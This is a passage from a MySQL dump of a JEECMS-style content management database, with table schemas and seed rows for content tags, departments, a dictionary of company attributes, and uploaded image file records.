INSERT INTO `jc_content_type` VALUES (4, '头条', 0, 0, 0, 0);

-- ----------------------------
-- Table structure for jc_contenttag
-- ----------------------------
DROP TABLE IF EXISTS `jc_contenttag`;
CREATE TABLE `jc_contenttag`  (
  `content_id` int(11) NOT NULL,
  `tag_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL,
  INDEX `fk_jc_content_tag`(`tag_id`) USING BTREE,
  INDEX `fk_jc_tag_content`(`content_id`) USING BTREE,
  CONSTRAINT `fk_jc_content_tag` FOREIGN KEY (`tag_id`) REFERENCES `jc_content_tag` (`tag_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_tag_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS内容标签关联表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_contenttag
-- ----------------------------
INSERT INTO `jc_contenttag` VALUES (47, 436, 0);
INSERT INTO `jc_contenttag` VALUES (47, 437, 1);
INSERT INTO `jc_contenttag` VALUES (47, 298, 2);
INSERT INTO `jc_contenttag` VALUES (47, 438, 3);
INSERT INTO `jc_contenttag` VALUES (47, 439, 4);
INSERT INTO `jc_contenttag` VALUES (49, 440, 0);
INSERT INTO `jc_contenttag` VALUES (50, 441, 0);
INSERT INTO `jc_contenttag` VALUES (53, 450, 0);
INSERT INTO `jc_contenttag` VALUES (57, 443, 0);
INSERT INTO `jc_contenttag` VALUES (57, 444, 1);
INSERT INTO `jc_contenttag` VALUES (57, 445, 2);
INSERT INTO `jc_contenttag` VALUES (57, 446, 3);
INSERT INTO `jc_contenttag` VALUES (57, 447, 4);
INSERT INTO `jc_contenttag` VALUES (57, 448, 5);
INSERT INTO `jc_contenttag` VALUES (57, 449, 6);
INSERT INTO `jc_contenttag` VALUES (58, 443, 0);
INSERT INTO `jc_contenttag` VALUES (58, 444, 1);
INSERT INTO `jc_contenttag` VALUES (58, 445, 2);
INSERT INTO `jc_contenttag` VALUES (58, 446, 3);
INSERT INTO `jc_contenttag` VALUES (58, 447, 4);
INSERT INTO `jc_contenttag` VALUES (58, 448, 5);
INSERT INTO `jc_contenttag` VALUES (58, 449, 6);
INSERT INTO `jc_contenttag` VALUES (53, 451, 1);
INSERT INTO `jc_contenttag` VALUES (53, 452, 2);
INSERT INTO `jc_contenttag` VALUES (53, 453, 3);
INSERT INTO `jc_contenttag` VALUES (53, 454, 4);
INSERT INTO `jc_contenttag` VALUES (53, 455, 5);
INSERT INTO `jc_contenttag` VALUES (53, 456, 6);
INSERT INTO `jc_contenttag` VALUES (53, 457, 7);
INSERT INTO `jc_contenttag` VALUES (53, 458, 8);
INSERT INTO `jc_contenttag` VALUES (53, 459, 9);
INSERT INTO `jc_contenttag` VALUES (53, 460, 10);
INSERT INTO `jc_contenttag` VALUES (53, 461, 11);
INSERT INTO `jc_contenttag` VALUES (53, 462, 12);
INSERT INTO `jc_contenttag` VALUES (52, 463, 0);
INSERT INTO `jc_contenttag` VALUES (52, 464, 1);
INSERT INTO `jc_contenttag` VALUES (52, 465, 2);
INSERT INTO `jc_contenttag` VALUES (52, 466, 3);
INSERT INTO `jc_contenttag` VALUES (52, 467, 4);
INSERT INTO `jc_contenttag` VALUES (52, 468, 5);
INSERT INTO `jc_contenttag` VALUES (52, 469, 6);
INSERT INTO `jc_contenttag` VALUES (52, 470, 7);
INSERT INTO `jc_contenttag` VALUES (49, 471, 1);
INSERT INTO `jc_contenttag` VALUES (49, 472, 2);
INSERT INTO `jc_contenttag` VALUES (51, 473, 0);
INSERT INTO `jc_contenttag` VALUES (51, 474, 1);
INSERT INTO `jc_contenttag` VALUES (51, 475, 2);

-- ----------------------------
-- Table structure for jc_department
-- ----------------------------
DROP TABLE IF EXISTS `jc_department`;
CREATE TABLE `jc_department`  (
  `depart_id` int(11) NOT NULL AUTO_INCREMENT,
  `depart_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '部门名称',
  `site_id` int(11) NULL DEFAULT 0 COMMENT '站点',
  `priority` int(11) NOT NULL DEFAULT 1 COMMENT '排序',
  `weights` int(11) NOT NULL DEFAULT 1 COMMENT '权重(值越大，级别越高)',
  `parent_id` int(11) NULL DEFAULT NULL COMMENT '父级部门ID',
  PRIMARY KEY (`depart_id`) USING BTREE,
  INDEX `fk_jc_department_site`(`site_id`) USING BTREE,
  INDEX `fk_jc_jc_department_parent`(`parent_id`) USING BTREE,
  CONSTRAINT `fk_jc_jc_department_parent` FOREIGN KEY (`parent_id`) REFERENCES `jc_department` (`depart_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '部门' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_department
-- ----------------------------
INSERT INTO `jc_department` VALUES (1, '一级部门', NULL, 1, 1, NULL);

-- ----------------------------
-- Table structure for jc_dictionary
-- ----------------------------
DROP TABLE IF EXISTS `jc_dictionary`;
CREATE TABLE `jc_dictionary`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT 'name',
  `value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT 'value',
  `type` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT 'type',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 12 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '字典表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_dictionary
-- ----------------------------
INSERT INTO `jc_dictionary` VALUES (1, '10-20人', '10-20人', 'scale');
INSERT INTO `jc_dictionary` VALUES (2, '20-50人', '20-50人', 'scale');
INSERT INTO `jc_dictionary` VALUES (3, '50-10人', '50-10人', 'scale');
INSERT INTO `jc_dictionary` VALUES (4, '100人以上', '100人以上', 'scale');
INSERT INTO `jc_dictionary` VALUES (5, '私企', '私企', 'nature');
INSERT INTO `jc_dictionary` VALUES (6, '股份制', '股份制', 'nature');
INSERT INTO `jc_dictionary` VALUES (7, '国企', '国企', 'nature');
INSERT INTO `jc_dictionary` VALUES (8, '互联网', '互联网', 'industry');
INSERT INTO `jc_dictionary` VALUES (9, '房地产', '房地产', 'industry');
INSERT INTO `jc_dictionary` VALUES (10, '加工制造', '加工制造', 'industry');
INSERT INTO `jc_dictionary` VALUES (11, '服务行业', '服务行业', 'industry');

-- ----------------------------
-- Table structure for jc_directive_tpl
-- ----------------------------
DROP TABLE IF EXISTS `jc_directive_tpl`;
CREATE TABLE `jc_directive_tpl`  (
  `tpl_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '标签名称',
  `description` varchar(1000) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '标签描述',
  `code` text CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '标签代码',
  `user_id` int(11) NOT NULL COMMENT '标签创建者',
  PRIMARY KEY (`tpl_id`) USING BTREE,
  INDEX `fk_jc_directive_tpl_user`(`user_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'FComment' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_file
-- ----------------------------
DROP TABLE IF EXISTS `jc_file`;
CREATE TABLE `jc_file`  (
  `file_path` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '文件路径',
  `file_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '' COMMENT '文件名字',
  `file_isvalid` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否有效',
  `content_id` int(11) NULL DEFAULT NULL COMMENT '内容id',
  PRIMARY KEY (`file_path`) USING BTREE,
  INDEX `fk_jc_file_content`(`content_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_file
-- ----------------------------
INSERT INTO `jc_file` VALUES ('/jeecmsv8/u/cms/www/201606/30094553q0uo.jpg', 'Koala.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/jeecmsv8f/u/cms/www/201610/13165317n9v8.jpg', '1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/bj/201505/15163118hoig.jpg', 'mv1.jpg', 0, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/09093632txyy.jpg', '09093632txyy.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/090938248x1c.jpg', '090938248x1c.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/090940173zaj.jpg', '090940173zaj.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/09094140f562.jpg', '09094140f562.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/09094302sldg.jpg', '09094302sldg.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/09094430w0xt.jpg', '09094430w0xt.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/09151507n6i1.jpg', '09151507n6i1.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/09152518pzoq.jpg', '09152518pzoq.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/09152931cgps.jpg', '09152931cgps.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/091552426die.jpg', '091552426die.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/0915541140xt.jpg', '0915541140xt.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/09160120meel.jpg', '09160120meel.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/091602465aop.jpg', '091602465aop.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/09165026tk5e.jpg', '09165026tk5e.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/091655240woj.jpg', '091655240woj.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/09165821s06r.jpg', '09165821s06r.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/09170006n0hs.jpg', '09170006n0hs.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/09174523xkvt.jpg', '09174523xkvt.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/09174527lkok.jpg', '09174527lkok.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/10092229195q.jpg', '10092229195q.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/100950366ij3.jpg', '100950366ij3.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/100953460bvo.jpg', '100953460bvo.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/10103806oifr.jpg', '10103806oifr.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/10104531ukj5.jpg', '10104531ukj5.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/10144918u244.jpg', '10144918u244.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11165619lkm8.jpg', '11165619lkm8.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11165624319n.jpg', '11165624319n.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/111656292jx9.jpg', '111656292jx9.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11165633po01.jpg', '11165633po01.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/111656366w4b.jpg', '111656366w4b.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11165640djk4.jpg', '11165640djk4.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11165849ahx1.jpg', '11165849ahx1.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11170224nw94.jpg', '11170224nw94.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11170651qc2f.jpg', '11170651qc2f.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11170656zz9b.jpg', '11170656zz9b.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/111707001w2k.jpg', '111707001w2k.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11170703j2h2.jpg', '11170703j2h2.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/111707071tn0.jpg', '111707071tn0.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11170712hp37.jpg', '11170712hp37.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/111707541g63.jpg', '111707541g63.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11171054ja61.jpg', '11171054ja61.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11171058td8f.jpg', '11171058td8f.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11171102ae78.jpg', '11171102ae78.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11171106qaui.jpg', '11171106qaui.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11171109m2sr.jpg', '11171109m2sr.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11171211kmih.jpg', '11171211kmih.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11171546aux9.jpg', '11171546aux9.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/111715499z6t.jpg', '111715499z6t.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11171553t5kf.jpg', '11171553t5kf.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11171558kiit.jpg', '11171558kiit.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11171603em6o.jpg', '11171603em6o.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11171606wnmy.jpg', '11171606wnmy.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/1117164754x7.jpg', '1117164754x7.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11172127ltqx.jpg', '11172127ltqx.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/111721308eyj.jpg', '111721308eyj.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11172134wikw.jpg', '11172134wikw.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11172137nwy5.jpg', '11172137nwy5.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11172219hw2t.jpg', '11172219hw2t.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11173208w8ji.jpg', '11173208w8ji.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11173213qlec.jpg', '11173213qlec.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/111732181p5u.jpg', '111732181p5u.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11173222qknp.jpg', '11173222qknp.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/1117323496nx.jpg', '1117323496nx.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11173244ggfv.jpg', '11173244ggfv.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11173334yvdd.jpg', '11173334yvdd.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/111737053v9i.jpg', '111737053v9i.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11173708ffx2.jpg', '11173708ffx2.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11173711toqx.jpg', '11173711toqx.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11173718do4k.jpg', '11173718do4k.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11173719ykxk.jpg', '11173719ykxk.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11173724ul7o.jpg', '11173724ul7o.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11173804j6hj.jpg', '11173804j6hj.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11174436pnoi.jpg', '11174436pnoi.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/11174439eb3l.jpg', '11174439eb3l.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/1117444317kg.jpg', '1117444317kg.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/111744466aux.jpg', '111744466aux.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/111745157ps9.jpg', '111745157ps9.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12105715powr.jpg', '12105715powr.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12105715u0i2.jpg', '12105715u0i2.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12105716avso.jpg', '12105716avso.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12105716f0ks.jpg', '12105716f0ks.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12105716u081.jpg', '12105716u081.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12105717rgdv.jpg', '12105717rgdv.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12105908yuqz.jpg', '12105908yuqz.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121101457hlo.jpg', '121101457hlo.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121101459s0t.jpg', '121101459s0t.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12110145r34m.jpg', '12110145r34m.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12110146fexh.jpg', '12110146fexh.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12110146v1cq.jpg', '12110146v1cq.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12110146ynj3.jpg', '12110146ynj3.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12110240hrzh.jpg', '12110240hrzh.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121104013vts.jpg', '121104013vts.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12110726kcxc.jpg', '12110726kcxc.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12110726rqp4.jpg', '12110726rqp4.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121107270owq.jpg', '121107270owq.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/1211072762wj.jpg', '1211072762wj.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12110728cz8z.jpg', '12110728cz8z.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12110728hvna.jpg', '12110728hvna.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12110817ejy1.jpg', '12110817ejy1.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12111106jy1l.jpg', '12111106jy1l.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12111106lobh.jpg', '12111106lobh.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12111106zad3.jpg', '12111106zad3.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12111106zedy.jpg', '12111106zedy.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12111107ctqg.jpg', '12111107ctqg.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12111107l4wg.jpg', '12111107l4wg.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/1211124392sy.jpg', '1211124392sy.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12111518igwr.jpg', '12111518igwr.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12111518kvd2.jpg', '12111518kvd2.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12111518l3p5.jpg', '12111518l3p5.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12111518vk7v.jpg', '12111518vk7v.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121115195muw.jpg', '121115195muw.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12111519tyc2.jpg', '12111519tyc2.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/1211190051if.jpg', '1211190051if.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12112124imh5.jpg', '12112124imh5.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121121253f1z.jpg', '121121253f1z.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121121265tk1.jpg', '121121265tk1.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121121267h0z.jpg', '121121267h0z.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12112127795n.jpg', '12112127795n.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12112128ltfy.jpg', '12112128ltfy.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12112247lfhe.jpg', '12112247lfhe.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12120435rmvm.jpg', '12120435rmvm.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12120436on4w.jpg', '12120436on4w.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121204384v5d.jpg', '121204384v5d.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121204408a3o.jpg', '121204408a3o.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/1212044200gm.jpg', '1212044200gm.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121207389dlf.jpg', '121207389dlf.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134158q84h.jpg', '12134158q84h.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134158qzrx.jpg', '12134158qzrx.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121341597c2x.jpg', '121341597c2x.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134159kbxa.jpg', '12134159kbxa.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134159robe.jpg', '12134159robe.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134200cwyl.jpg', '12134200cwyl.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134300ap1h.jpg', '12134300ap1h.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134450lo6n.jpg', '12134450lo6n.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134450mwvm.jpg', '12134450mwvm.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134451j9p9.jpg', '12134451j9p9.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134451k1zj.jpg', '12134451k1zj.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134452b2g1.jpg', '12134452b2g1.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134452bb5z.jpg', '12134452bb5z.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134552bk69.jpg', '12134552bk69.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121348103ux5.jpg', '121348103ux5.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121348109k92.jpg', '121348109k92.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121348110tfi.jpg', '121348110tfi.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134811y9du.jpg', '12134811y9du.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134812unit.jpg', '12134812unit.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12134933sxsx.jpg', '12134933sxsx.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12135148im9s.jpg', '12135148im9s.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12135149ar88.jpg', '12135149ar88.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12135149bhlg.jpg', '12135149bhlg.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12135149s2wm.jpg', '12135149s2wm.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12135243x57l.jpg', '12135243x57l.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12135606e58j.jpg', '12135606e58j.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12135607ftvv.jpg', '12135607ftvv.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12135607vqhp.jpg', '12135607vqhp.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12135608ad8p.jpg', '12135608ad8p.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12135608l3ai.jpg', '12135608l3ai.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12135609wexl.jpg', '12135609wexl.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12135827xy0y.jpg', '12135827xy0y.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12135944xk9f.jpg', '12135944xk9f.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12140033b5mx.jpg', '12140033b5mx.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12140434ixtu.jpg', '12140434ixtu.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12140434n4th.jpg', '12140434n4th.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12140435relm.jpg', '12140435relm.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12140436rua8.jpg', '12140436rua8.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12140436wwsc.jpg', '12140436wwsc.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12140851yp14.jpg', '12140851yp14.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12141311nuua.jpg', '12141311nuua.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12141311xxbj.jpg', '12141311xxbj.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12141312d3p6.jpg', '12141312d3p6.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12141312r6eb.jpg', '12141312r6eb.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/1214131399h0.jpg', '1214131399h0.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12141313ndlq.jpg', '12141313ndlq.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121414505xah.jpg', '121414505xah.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12142118fe7p.jpg', '12142118fe7p.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/121421197sla.jpg', '121421197sla.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12142119m8y5.jpg', '12142119m8y5.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12142120loqu.jpg', '12142120loqu.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12142120u2tx.jpg', '12142120u2tx.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/1214212172bk.jpg', '1214212172bk.jpg', 1, NULL);
INSERT INTO `jc_file` VALUES ('/u/cms/www/12142322wa0z.jpg', '12142322wa0z.jpg', 1, NULL);
